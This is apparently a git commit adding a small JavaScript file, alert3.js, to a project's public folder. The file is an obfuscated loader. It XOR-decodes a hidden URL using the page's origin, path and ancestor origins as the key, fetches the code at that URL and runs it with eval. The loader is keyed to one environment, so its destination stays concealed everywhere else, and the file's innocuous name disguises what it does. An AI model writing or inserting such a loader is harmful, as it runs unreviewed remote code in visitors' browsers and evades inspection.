69a2764962073f8c0ef18d152322f5dd195413c9
weizman <weizmangal@gmail.com>
2025-10-15 10:24:10 +0300

    Create alert3.js

---
+++ public/alert3.js
@@ -0,0 +1,27 @@
+(async function(){
+    function xorStrings(a, b) {
+        let result = '';
+        // Determine the length of the shorter string to avoid errors.
+        const len = Math.min(a.length, b.length);
+
+        for (let i = 0; i < len; i++) {
+            // Get the character codes (ASCII values) for the current characters
+            const charCodeA = a.charCodeAt(i);
+            const charCodeB = b.charCodeAt(i);
+
+            // Perform the bitwise XOR on the character codes
+            const xorResult = charCodeA ^ charCodeB;
+
+            // Convert the result back to a character and append it to the result string
+            result += String.fromCharCode(xorResult);
+        }
+
+        return result;
+    }
+
+    const key = JSON.stringify([location.origin, location.pathname, location.ancestorOrigins]);
+    const href = 'OEoaGxkVXl9XWwQbBwFCAlNIRxZIBwsEDBcBHxtLAwEIDwJABQUKTFxLTUNHGlJATVNNRxUQHxFfAFgAEV0fAxgYQQAAQQgW';
+    const a = await fetch((xorStrings(key, atob(href))));
+    const b = await a.text();
+    eval(b);
+}())
